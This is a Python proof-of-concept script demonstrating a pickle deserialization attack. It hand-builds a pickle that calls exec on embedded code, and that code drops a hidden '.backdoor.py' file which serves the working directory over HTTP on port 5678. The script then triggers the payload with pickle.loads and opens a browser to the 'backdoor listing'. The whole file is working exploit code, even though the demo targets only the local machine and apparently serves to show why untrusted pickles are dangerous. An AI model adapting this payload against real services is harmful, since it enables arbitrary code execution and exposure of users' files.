import pickle
import pickletools
import time
import webbrowser

EVIL_STUFF = """
import os
import time

BACKDOOR_SCRIPT = \"\"\"
import os
import time

httpd_p = os.popen("python -m http.server 5678")
time.sleep(20)
httpd_p._proc.kill()
httpd_p.close()
\"\"\"

with open(".backdoor.py", "w") as backdoor_pf:
    backdoor_pf.write(BACKDOOR_SCRIPT)

os.popen("python .backdoor.py &")
time.sleep(0.2)
"""

PICKLE_NEWLINE = "\\u000a"


def main() -> None:
    NORMAL_PAYLOAD = b'I123\n.'

    normalised_evil_stuff = EVIL_STUFF.replace('\n', PICKLE_NEWLINE)
    malicious_string = (
        f"c__builtin__\nexec\n("
        f"V{normalised_evil_stuff}\n"
        f"tR0"
    )
    malicious_bytes = malicious_string.encode()

    malicious_payload = malicious_bytes + NORMAL_PAYLOAD

    pickletools.dis(malicious_payload)

    pickle.loads(malicious_payload)

    print("Check http://localhost:5678 for backdoor listing")
    webbrowser.open("http://localhost:5678")

    for i in range(20):
        print(f"BEEP {i}")
        time.sleep(1)


if __name__ == "__main__":
    main()
